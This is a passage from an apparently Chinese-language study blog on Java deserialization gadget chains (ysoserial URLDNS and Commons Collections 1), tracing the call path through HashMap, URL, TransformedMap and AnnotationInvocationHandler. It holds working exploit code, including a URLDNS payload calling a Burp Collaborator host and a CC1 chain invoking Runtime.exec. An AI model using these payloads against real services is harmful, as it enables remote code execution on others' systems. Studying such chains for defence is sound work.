class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为链子已经清楚，是反序列化的时候调用<code>HashMap</code>的<code>readObject</code>方法，所以我们可以先直接看<code>HashMap</code></p>
<p>首先我们是把url当作key给HashMap的，所以可以只看最后的一段内容，因为前面都不会涉及到key，然后我们可以发现，在<code>putvalue</code>的时候调用了hash函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line">    putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hash函数里面重新给h赋值，并且调用key的hashCode方法，而我们已经知道是URL.hashCode()，可以直接去看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>); <span class="comment">// 获取key的hashCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>hashCode</code>的值不为-1，则直接返回，否则跳转到另一个<code>hashCode</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有<code>getHostAddress</code>方法，参数为我们传入的url，如果我们传入的不是IPV4的格式就会调用<code>getByName</code>,从而在<code>getByName</code>时候造成对url进行DNS解析请求</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220325204635981.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> u.getHostAddress();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hostAddress != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        hostAddress = InetAddress.getByName(host); <span class="comment">// 根据主机名获取ip名字 触发DNS请求</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/a230d1786edd444e9f53be8688e9c379.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>注意:</p>
<p>​    1.当一开始URL的hashCode为-1的时候也会自动发生DNS请求，所以在<code>URLStreamHandler handler = new SilentURLStreamHandler();</code>重写<code>getHostAddress</code>，将handler传给url，使得一开始执行getHostAddress方法的时候并不会发现DNS请求，从而防止了一开始发生DNS请求，但是<code>handle</code>又是为<code>transient</code>类型，在序列化的时候不参与，所以后面并不会影响反序列化的时候调用我们需要的<code>getHostAddress</code>方法</p>
<p>​    2.而后面又在<code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code>中设置hashCode为-1，实现在反序列化之前强制<code>hashCode</code>为-1，从而后面的getHostAddress方法可以调用</p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream os = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = os.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://zy1ok3czhtt8z7qmwpi4xkxiy942sr.burpcollaborator.net&quot;</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field field = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(url,<span class="number">1223</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashMap.put(new URL(&quot;http://g0h5mkegjavp1os3y6klz1zz0q6gu5.burpcollaborator.net&quot;), 1);</span></span><br><span class="line">        field.set(url,-<span class="number">1</span>); <span class="comment">// hashcode改成-1</span></span><br><span class="line">       </span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>后记：又过了一遍之后确实比第一遍会更明白一些，但是还有有着一种悬浮感（？，如果硬是要说也是能把师傅们对于这个链子的解析说出来，但是自己却不一定真的完全能理解其中的点，感觉是比较细节的、底层的知识还是不够，继续学习吧！</p>
</blockquote>
<h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><p>（jdk&lt;8u71</p>
<p>因为ysoserial的payload实在有点难以理解，所以先跟P神的链子吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                                   <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Transformer</code>是一个接口，方法返回值类一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ConstantTransformer</code>是实现<code>Transformer</code>和<code>Serializable</code>接口的类，在构造的时候传入一个类并在重载接口的方法的时候将这个类返回，所以上面的<code>new ConstantTransformer(Runtime.getRuntime())</code>会返回<code>Runtime.getRuntime()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Transformer NULL_INSTANCE = <span class="keyword">new</span> ConstantTransformer((Object)<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="keyword">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> ConstantTransformer(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getConstant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer</code>，构造函数里传入的值为方法名、参数类型以及参数，然后在重载<code>Transformer</code>的方法的时候进行对应的函数调用，实现任意方法调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	·····</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            ······</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer</code>将多个<code>transformers</code>串联起来，即前一个的返回值即为下一个的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再来看最后几行的，先去看一下<code>decorate</code>，只是进行一个类的实例和属性初始化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,transformerChain); <span class="comment">// 实例化一个新的TransformedMap</span></span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer); <span class="comment">// 将map传给父类，其他用于初始化，</span></span><br><span class="line">    <span class="comment">// this.valueTransformer = transformerChain;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractMapDecorator</span><span class="params">(Map map)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (map == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Map must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后通过调用<code>put</code>传入新的映射在<code>transformValue</code>产生回调</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">    key = <span class="keyword">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.valueTransformer.transform(object);</span><br><span class="line">    <span class="comment">// 实现调用 transformerChain.transform(String)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现调用<code>ChainedTransformer.transform</code>，之后根据<code>this.iTransformers[i]</code>依次调用<code>ConstantTransformer.transform</code>|<code>InvokerTransformer.transform</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer.transform </span></span><br><span class="line"><span class="comment">// invoke实现任意方法执行</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>虽然上面的demo在本地运行的时候是可以的，但是我们最终是要通过反序列化去实现任意代码执行的，所以我们要通过<code>readObject</code>去实现回调，那么这里就是用到了<code>AnnotationInvocationHandler</code>类</p>
<p>直接来看一下这个类的<code>readObject</code>方法（8u66</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject(); <span class="comment">// 单纯调用一份方法 var1在后面都没有被调用</span></span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>; <span class="comment">// 初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type); <span class="comment">// 获取我们传进去的类 Retention.class</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes(); <span class="comment">// 返回memberTypes</span></span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); <span class="comment">// 通过我们传进去的Map进行操作 outerMap</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Entry var5 = (Entry)var4.next(); </span><br><span class="line">        String var6 = (String)var5.getKey(); <span class="comment">// 获取键值</span></span><br><span class="line">        Class var7 = (Class)var3.get(var6); <span class="comment">//this.memberTypes.get =&gt; Map.get 获取key为var6的value 否则为null</span></span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123; <span class="comment">// 不能为null 所以前面的var4</span></span><br><span class="line">            Object var8 = var5.getValue(); <span class="comment">// 获取key所映射的value</span></span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 设置新的value</span></span><br><span class="line">                var5.setValue(</span><br><span class="line">                    (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    ).setMember(</span><br><span class="line">                        (Method)var2.members().get(var6)</span><br><span class="line">                    ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取我们传入的被<code>TransformedMap</code>修饰过的Map，以及用来保证<code>var7</code>不为空的类。遍历Map里面的我们写入的代码，随后在setValue中触发<code>TransformedMap</code>的<code>transform</code>，从而实现任意代码执行 </p>
<p><del><em><strong>这里有个小问题</strong>：setValue是怎么实现触发transform的，虽然打断点之后走比较明显，但是还是有点不能理解，然后发现用反射传入的类在反序列化的时候，打断点调试的时候是不会走到这个类里面的，但是会到抽象类里面调用他执行的方法 感觉还是java基础不行</em></del>（已解决</p>
<blockquote>
<ul>
<li><p>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p>
</li>
<li><p>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</p>
</li>
</ul>
</blockquote>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1ForP2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="comment">// getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="comment">// 方法名</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="comment">// 参数类型</span></span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125; <span class="comment">// 参数</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="comment">// =&gt; exec(&quot;calc&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers); <span class="comment">// 将上面的串联起来 前面的返回值进行回调</span></span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span 